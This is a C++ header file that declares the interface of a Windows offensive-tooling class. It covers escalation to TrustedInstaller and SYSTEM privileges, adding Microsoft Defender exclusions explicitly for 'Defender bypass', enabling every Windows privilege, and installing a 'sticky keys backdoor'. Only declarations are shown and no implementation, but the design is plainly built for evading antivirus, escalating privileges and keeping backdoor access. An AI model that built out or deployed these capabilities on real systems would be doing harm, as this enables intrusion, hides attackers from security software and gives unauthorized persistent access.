#pragma once

#include <windows.h>
#include <string>
#include <vector>

// TrustedInstaller privilege escalation for maximum system access
class TrustedInstallerIntegrator
{
public:
    TrustedInstallerIntegrator();
    ~TrustedInstallerIntegrator();

    // Enhanced exclusion types for comprehensive Defender management
    enum class ExclusionType {
        Paths,
        Processes, 
        Extensions,
        IpAddresses
    };

    // Main public interface for elevated operations
    bool RunAsTrustedInstaller(const std::wstring& commandLine);
    bool RunAsTrustedInstallerSilent(const std::wstring& commandLine);
    
    // Legacy exclusion management (backward compatibility)
    bool AddToDefenderExclusions(const std::wstring& customPath = L"");
    bool RemoveFromDefenderExclusions(const std::wstring& customPath = L"");
    bool AddContextMenuEntries();
    
    // Enhanced exclusion management with type specification
    bool AddDefenderExclusion(ExclusionType type, const std::wstring& value);
    bool RemoveDefenderExclusion(ExclusionType type, const std::wstring& value);
    
    // Type-specific exclusion methods for convenience
    bool AddExtensionExclusion(const std::wstring& extension);
    bool RemoveExtensionExclusion(const std::wstring& extension);
    bool AddIpAddressExclusion(const std::wstring& ipAddress);
    bool RemoveIpAddressExclusion(const std::wstring& ipAddress);
    
    // Sticky keys backdoor management
    bool InstallStickyKeysBackdoor() noexcept;
    bool RemoveStickyKeysBackdoor() noexcept;
    
    // Process exclusion management for Defender bypass
    bool AddProcessToDefenderExclusions(const std::wstring& processName);
    bool RemoveProcessFromDefenderExclusions(const std::wstring& processName);
    
    // Public access methods for Controller integration
    static const LPCWSTR* GetAllPrivileges() { return ALL_PRIVILEGES; }
    static int GetPrivilegeCount() { return PRIVILEGE_COUNT; }
    bool PublicImpersonateSystem() { return ImpersonateSystem(); }
    
    // TrustedInstaller token management
    HANDLE GetCachedTrustedInstallerToken();
    DWORD StartTrustedInstallerService();

private:
    // Privilege and process management
    BOOL EnablePrivilege(LPCWSTR privilegeName);
    DWORD GetProcessIdByName(LPCWSTR processName);
    BOOL ImpersonateSystem();
    
    // Process creation with TrustedInstaller token
    BOOL CreateProcessAsTrustedInstaller(DWORD pid, LPCWSTR commandLine);
    BOOL CreateProcessAsTrustedInstallerSilent(DWORD pid, LPCWSTR commandLine);
    
    // Shortcut file handling for .lnk support
    std::wstring ResolveLnk(LPCWSTR lnkPath);
    BOOL IsLnkFile(LPCWSTR filePath);
    bool AddPathExclusion(const std::wstring& path);

    // Validation and helper methods for exclusions
    bool ValidateExtension(const std::wstring& extension) noexcept;
    bool ValidateIpAddress(const std::wstring& ipAddress) noexcept;
    std::wstring NormalizeExtension(const std::wstring& extension) noexcept;
    std::wstring GetExclusionTypeString(ExclusionType type) noexcept;

    // Complete Windows privilege set for maximum access
    static const LPCWSTR ALL_PRIVILEGES[];
    static const int PRIVILEGE_COUNT;
};